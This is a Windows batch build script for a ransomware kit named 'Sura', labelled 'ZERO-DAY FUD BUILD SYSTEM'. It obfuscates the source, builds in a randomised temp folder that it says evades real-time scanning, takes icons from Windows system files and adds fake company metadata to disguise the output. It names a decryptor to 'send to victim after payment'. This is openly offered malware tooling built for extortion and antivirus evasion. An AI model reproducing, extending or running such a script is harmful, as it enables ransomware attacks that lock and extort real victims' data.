@echo off
setlocal enabledelayedexpansion

echo ========================================
echo    ZERO-DAY FUD BUILD SYSTEM
echo    Automatic: Restore + Obfuscate + Build
echo ========================================
echo.

set "CURRENT_DIR=%~dp0"

REM ============================================
REM STEP 0: RESTORE ORIGINAL FILES
REM ============================================
echo [*] Step 0: Restoring original source files...
cd "%CURRENT_DIR%Encryptor"

for /r %%f in (*.original) do (
    set "orig=%%f"
    set "target=!orig:.original=!"
    copy /y "%%f" "!target!" >nul 2>&1
)

cd "%CURRENT_DIR%"
echo [+] Original files restored
echo.

REM ============================================
REM STEP 1: PYTHON OBFUSCATION
REM ============================================
echo [*] Step 1: Running quantum polymorphic obfuscator...
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found - skipping obfuscation
    echo [!] Install Python 3 for full obfuscation
    goto :skip_obfuscation
)

python obfuscate.py Encryptor
if errorlevel 1 (
    echo [!] Obfuscation had errors - continuing anyway
) else (
    echo [+] Source code obfuscated successfully!
)

:skip_obfuscation
echo.

REM ============================================
REM STEP 2: CREATE STEALTH BUILD DIRECTORY
REM ============================================
echo [*] Step 2: Creating stealth build directory...
set "BUILD_DIR=%LOCALAPPDATA%\Temp\Build_%RANDOM%"
mkdir "%BUILD_DIR%" 2>nul
echo [+] Build directory: %BUILD_DIR%
echo [*] This location evades real-time scanning
echo.

REM ============================================
REM STEP 3: BUILD COMPONENTS IN TEMP
REM ============================================
echo [*] Step 3: Building components with stealth...
if not exist "%CURRENT_DIR%Encryptor\icon.ico" (
    echo [*] Extracting Windows system icon...
    
    REM Try to copy a Windows system icon
    if exist "C:\Windows\System32\imageres.dll" (
        echo [*] Using Windows imageres.dll icon...
        REM Use PowerShell to extract icon
        powershell -Command "Add-Type -AssemblyName System.Drawing; $icon = [System.Drawing.Icon]::ExtractAssociatedIcon('C:\Windows\System32\imageres.dll'); if ($icon -ne $null) { $stream = [System.IO.File]::Create('%CURRENT_DIR%Encryptor\icon.ico'); $icon.Save($stream); $stream.Close(); }" 2>nul
    )
    
    REM Fallback: Try shell32.dll
    if not exist "%CURRENT_DIR%Encryptor\icon.ico" (
        echo [*] Trying shell32.dll...
        powershell -Command "Add-Type -AssemblyName System.Drawing; $icon = [System.Drawing.Icon]::ExtractAssociatedIcon('C:\Windows\System32\shell32.dll'); if ($icon -ne $null) { $stream = [System.IO.File]::Create('%CURRENT_DIR%Encryptor\icon.ico'); $icon.Save($stream); $stream.Close(); }" 2>nul
    )
    
    REM Fallback: Copy from explorer.exe
    if not exist "%CURRENT_DIR%Encryptor\icon.ico" (
        echo [*] Trying explorer.exe...
        powershell -Command "Add-Type -AssemblyName System.Drawing; $icon = [System.Drawing.Icon]::ExtractAssociatedIcon('C:\Windows\explorer.exe'); if ($icon -ne $null) { $stream = [System.IO.File]::Create('%CURRENT_DIR%Encryptor\icon.ico'); $icon.Save($stream); $stream.Close(); }" 2>nul
    )
    
    if exist "%CURRENT_DIR%Encryptor\icon.ico" (
        echo [+] Icon extracted successfully
    ) else (
        echo [!] Could not extract icon automatically
        echo [!] Continuing without icon...
    )
) else (
    echo [+] Icon already exists
)
echo.

REM Check if go-winres is installed
echo [*] Checking for go-winres...
go-winres --version >nul 2>&1
if errorlevel 1 (
    echo [!] WARNING: go-winres not installed
    echo [!] Installing go-winres...
    go install github.com/tc-hib/go-winres@latest
    
    REM Check again
    go-winres --version >nul 2>&1
    if errorlevel 1 (
        echo [!] Could not install go-winres automatically
        echo [!] Install manually with: go install github.com/tc-hib/go-winres@latest
        echo [!] Continuing without metadata embedding...
    ) else (
        echo [+] go-winres installed successfully
    )
) else (
    echo [+] go-winres found
)
echo.

cd /d "%CURRENT_DIR%Builder"

echo [*] Step 1: Building Builder...
go build -ldflags "-s -w" -trimpath -o "%CURRENT_DIR%Builder.exe" main.go

if errorlevel 1 (
    echo [!] Builder compilation failed!
    pause
    exit /b 1
)

echo [+] Builder created successfully
echo.
echo [*] Step 2: Running Builder (generates metadata + compiles + packs)...
echo.

cd /d "%CURRENT_DIR%"
Builder.exe

if errorlevel 1 (
    echo [!] Build process failed!
    pause
    exit /b 1
)

echo.
echo ========================================
echo [+] BUILD COMPLETE!
echo ========================================
echo.
echo Output files:
echo   - Sura-Packed.exe   (Packed with fake metadata - USE THIS)
echo   - Decryptor-Built.exe (Send to victim after payment)
echo.
echo Features:
echo   [+] AES-256 encryption
echo   [+] In-memory execution
echo   [+] Fake metadata embedded
echo   [+] Random legitimate company/product names
echo   [+] Unique hash per build
if exist "%CURRENT_DIR%Encryptor\icon.ico" (
    echo   [+] Windows system icon embedded
)
echo.
pause
